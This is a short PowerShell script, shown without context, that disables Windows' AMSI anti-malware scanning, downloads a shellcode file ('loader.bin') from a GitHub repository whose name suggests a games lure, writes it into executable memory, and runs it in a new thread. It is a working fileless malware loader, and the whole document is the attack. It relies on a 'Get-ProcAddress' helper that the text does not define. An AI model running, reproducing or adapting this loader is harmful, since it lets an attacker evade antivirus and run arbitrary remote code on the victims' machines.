[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $shellcode = $wc.DownloadData('https://github.com/unblockedgames2/Fanta.Live/raw/refs/heads/main/loader.bin'); $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress -mod kernel32 -func 'VirtualAlloc'), [Func[UIntPtr,UInt32,UInt32,UInt32,UIntPtr]]) -as [Func[UIntPtr,UInt32,UInt32,UInt32,UIntPtr]]; $buffer = $VirtualAlloc.Invoke([UIntPtr]::Zero, [UInt32]$shellcode.Length, 0x3000, 0x40); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $buffer, $shellcode.Length); $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress -mod kernel32 -func 'CreateThread'), [Func[UIntPtr,UInt32,UIntPtr,UIntPtr,UInt32,UIntPtr,UIntPtr]]) -as [Func[UIntPtr,UInt32,UIntPtr,UIntPtr,UInt32,UIntPtr,UIntPtr]]; $CreateThread.Invoke([UIntPtr]::Zero, 0, $buffer, [UIntPtr]::Zero, 0, [UIntPtr]::Zero);
